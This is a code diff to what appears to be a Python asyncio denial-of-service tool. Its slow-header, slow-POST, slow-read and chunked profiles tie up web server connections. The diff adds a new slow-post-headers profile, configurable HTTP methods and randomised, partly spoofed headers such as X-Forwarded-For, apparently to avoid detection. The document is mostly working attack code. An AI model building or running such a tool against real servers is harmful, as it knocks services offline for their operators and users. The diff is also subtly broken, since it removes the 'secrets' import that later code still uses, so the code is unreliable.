@@ -19,7 +19,6 @@ from __future__ import annotations
 
 import asyncio
 import random
-import secrets
 import string
 from abc import ABC, abstractmethod
 
@@ -38,6 +37,20 @@ def _rand_ip() -> str:
     return ".".join(str(random.randint(0, 255)) for _ in range(4))
 
 
+def _rand_token(length: int = 8) -> str:
+    return "".join(random.choice(_ALNUM) for _ in range(length))
+
+
+def _rand_hex(length: int = 12) -> str:
+    return "".join(random.choice("0123456789abcdef") for _ in range(length))
+
+
+def _random_header_name(name: str) -> str:
+    return "".join(
+        ch.upper() if random.random() < 0.5 else ch.lower() if ch.isalpha() else ch for ch in name
+    )
+
+
 def _path(config: Config) -> str:
     separator = "&" if "?" in config.path else "?"
     return f"{config.path}{separator}{secrets.token_urlsafe(6)}"
@@ -54,6 +67,14 @@ def _base_headers(config: Config, ua: str) -> list[str]:
         "Keep-Alive: 900",
         "X-Requested-With: XMLHttpRequest",
     ]
+    if random.random() < 0.5:
+        headers.append(f"Referer: https://{config.header_host}/")
+    if random.random() < 0.35:
+        headers.append("Cache-Control: no-cache")
+    if random.random() < 0.25:
+        headers.append("DNT: 1")
+    if random.random() < 0.25:
+        headers.append("TE: trailers, deflate")
     if random.random() < 0.5:
         headers.append(f"X-Forwarded-For: {_rand_ip()}")
     if random.random() < 0.4:
@@ -82,7 +103,7 @@ async def _halt(stop: asyncio.Event, config: Config) -> None:
     """Sleep a random delay, but wake early if ``stop`` is set."""
     try:
         await asyncio.wait_for(stop.wait(), timeout=config.random_delay())
-    except asyncio.TimeoutError:
+    except TimeoutError:
         pass
 
 
@@ -123,10 +144,9 @@ class SlowPost(Profile):
         headers = _base_headers(config, ua)
         headers.append("Content-Type: application/x-www-form-urlencoded")
         headers.append(f"Content-Length: {length}")
+        method = config.method or "POST"
         req = (
-            f"POST {_path(config)} HTTP/1.1\r\n"
-            + "\r\n".join(headers)
-            + "\r\n\r\n"
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
         ).encode()
         await _write(writer, req, stats)
 
@@ -148,17 +168,45 @@ class SlowPost(Profile):
         return not stop.is_set()  # True if completed, False if interrupted
 
 
+class SlowPostHeaders(Profile):
+    name = "slow-post-headers"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        length = random.randint(config.base_post_length // 2, config.base_post_length)
+        headers = _base_headers(config, ua)
+        headers.append("Content-Type: application/x-www-form-urlencoded")
+        headers.append(f"Content-Length: {length}")
+        method = config.method or "POST"
+        lines = [f"{method} {_path(config)} HTTP/1.1"] + headers
+        while lines and not stop.is_set():
+            await _write(writer, (lines.pop(0) + "\r\n").encode(), stats)
+            await _halt(stop, config)
+        if not stop.is_set():
+            await _write(writer, b"\r\n", stats)
+        sent = 0
+        while not stop.is_set() and sent < length:
+            await _write(writer, _dribble(), stats)
+            sent += 1
+            await _halt(stop, config)
+
+
 class SlowHeaders(Profile):
     name = "slow-headers"
 
     async def run(self, reader, writer, config, ua, stats, stop):
         # Send the request line with the Host/UA headers but never the
         # terminating blank line, so the request stays "in progress".
-        req = f"GET {_path(config)} HTTP/1.1\r\n".encode()
+        method = config.method or "GET"
+        req = f"{method} {_path(config)} HTTP/1.1\r\n".encode()
         await _write(writer, req, stats)
+        # Send custom headers first (if any), then random X-headers
+        if config.custom_headers:
+            for header in config.custom_headers:
+                await _write(writer, (header + "\r\n").encode(), stats)
+                await _halt(stop, config)
         while not stop.is_set():
-            key = f"X-{secrets.token_hex(3)}"
-            value = secrets.token_hex(4)
+            key = f"X-{_rand_hex(6)}"
+            value = _rand_hex(8)
             await _write(writer, f"{key}: {value}\r\n".encode(), stats)
             await _halt(stop, config)
         return not stop.is_set()  # True if completed, False if interrupted
@@ -169,16 +217,15 @@ class SlowRead(Profile):
 
     async def run(self, reader, writer, config, ua, stats, stop):
         headers = _base_headers(config, ua)
+        method = config.method or "GET"
         req = (
-            f"GET {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
         ).encode()
         await _write(writer, req, stats)
         while not stop.is_set():
             try:
-                chunk = await asyncio.wait_for(
-                    reader.read(8), timeout=config.connect_timeout * 2
-                )
-            except asyncio.TimeoutError:
+                chunk = await asyncio.wait_for(reader.read(8), timeout=config.connect_timeout * 2)
+            except TimeoutError:
                 continue
             if not chunk:  # server closed the connection
                 break
@@ -202,10 +249,9 @@ class Chunked(Profile):
         headers = _base_headers(config, ua)
         headers.append("Transfer-Encoding: chunked")
         headers.append("Content-Type: application/x-www-form-urlencoded")
+        method = config.method or "POST"
         req = (
-            f"POST {_path(config)} HTTP/1.1\r\n"
-            + "\r\n".join(headers)
-            + "\r\n\r\n"
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
         ).encode()
         await _write(writer, req, stats)
 
@@ -233,6 +279,7 @@ class Chunked(Profile):
 
 PROFILES: dict[str, type[Profile]] = {
     SlowPost.name: SlowPost,
+    SlowPostHeaders.name: SlowPostHeaders,
     SlowHeaders.name: SlowHeaders,
     SlowRead.name: SlowRead,
     Chunked.name: Chunked,
